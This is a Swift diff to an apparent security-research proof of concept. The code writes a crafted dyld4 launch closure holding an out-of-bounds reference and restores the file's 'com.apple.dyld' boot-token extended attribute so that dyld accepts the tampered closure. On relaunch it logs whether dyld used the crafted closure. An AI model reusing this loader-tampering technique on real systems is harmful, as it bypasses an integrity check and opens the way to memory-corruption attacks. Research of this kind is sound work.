@@ -130,7 +130,20 @@ enum Dyld4 {
         guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
             return "PoC: patch write failed"
         }
-        return String(format: "PATCHED ref=0xffff count=%u — FORCE-QUIT AND REOPEN THE APP; it will restore automatically", count)
+        // .atomic replaces the file and drops its xattr; put the boot token
+        // back or dyld will reject the closure before validating it.
+        var tokenBuf = [CChar](repeating: 0, count: 256)
+        let got = "com.apple.dyld".withCString { name in
+            tokenBuf.withUnsafeBytes { raw -> Int in
+                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
+            }
+        }
+        if got > 0 {
+            _ = "com.apple.dyld".withCString { name in
+                setxattr(path, name, &tokenBuf, got, 0, 0)
+            }
+        }
+        return String(format: "PATCHED ref=0xffff count=%u token-restored=%d — FORCE-QUIT AND REOPEN", count, got)
     }
 
     /// Called at startup. If a PoC patch is pending, restore it and report
@@ -141,12 +154,26 @@ enum Dyld4 {
         let backup = path + ".probe-bak"
         guard FileManager.default.fileExists(atPath: backup),
               let original = FileManager.default.contents(atPath: backup) else { return nil }
+        // ★ Inspect the closure dyld just consumed, BEFORE restoring it.
+        let seen = Dyld4.inspect(path)
+        let evidence = String(format: "POC-SEEN-BY-DYLD count=%u ref=%@ idx=%@ verdict=%@ boot-token=%@",
+                              seen.count,
+                              seen.offenders.first.map { String(format: "0x%04x", $0.ref) } ?? "none",
+                              seen.offenders.first.map { String($0.idx) } ?? "none",
+                              seen.verdict, seen.bootToken)
+        // restore body + xattr
         try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
+        var tokenBuf = [CChar](repeating: 0, count: 256)
+        let got = "com.apple.dyld".withCString { name in
+            tokenBuf.withUnsafeBytes { raw -> Int in
+                getxattr(backup, name, UnsafeMutableRawPointer(mutating: raw.baseAddress), 255, 0, 0)
+            }
+        }
+        if got > 0 {
+            _ = "com.apple.dyld".withCString { name in setxattr(path, name, &tokenBuf, got, 0, 0) }
+        }
         try? FileManager.default.removeItem(atPath: backup)
-        let crafted = Dyld4.inspect(path)
-        return String(format: "POC-COMPLETED app survived relaunch; restored count=%u loaders=%d (crafted-ref check=%@)",
-                      crafted.count, crafted.loaders,
-                      crafted.offenders.isEmpty ? "NO-OOB" : "OOB-CONFIRMED")
+        return evidence + " ; RESTORED"
     }
 }
 
